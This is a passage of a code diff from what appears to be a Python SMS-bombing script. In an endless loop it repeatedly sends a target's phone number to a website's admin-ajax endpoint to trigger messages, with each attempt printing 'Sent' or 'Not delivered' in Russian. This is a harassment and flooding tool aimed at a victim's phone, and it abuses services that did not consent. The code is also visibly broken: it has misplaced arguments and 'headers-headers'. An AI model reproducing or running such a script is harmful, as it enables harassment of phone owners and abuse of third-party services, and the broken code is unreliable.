@@ -256,25 +256,25 @@ while True:
 #prosto.tv
  try:
      print('Отправлено')
-     response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers=headers, data={'phone': "+" + NUMBER}, 'username': 'TGHIronotori')
+     response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers=headers, data={'phone': "+" + NUMBER}, 'username' : 'TGHIronotori')
  except:
      print('Не доставлено')
 	 
  try:
      print('Отправлено')
-     response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers-headers, data={'phone' : NUMBER}, 'username': 'TGHIronotori')
+     response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers-headers, data={'phone' : NUMBER}, 'username' : 'TGHIronotori')
  except:
      print('Не доставлено')
 	 
  try:
      print('Отправлено')
-     response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers=headers, json={'phone': "+" + NUMBER}, 'username': 'TGHIronotori')
+     response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers=headers, json={'phone': "+" + NUMBER}, 'username' : 'TGHIronotori')
  except:
      print('Не доставлено')
 	 
  try:
      print('Отправлено')
-     response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers=headers, json={'phone' :  NUMBER}, 'username': 'TGHIronotori')
+     response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers=headers, json={'phone' :  NUMBER}, 'username' : 'TGHIronotori')
  except:
      print('Не доставлено')
 #kumo.com.ua
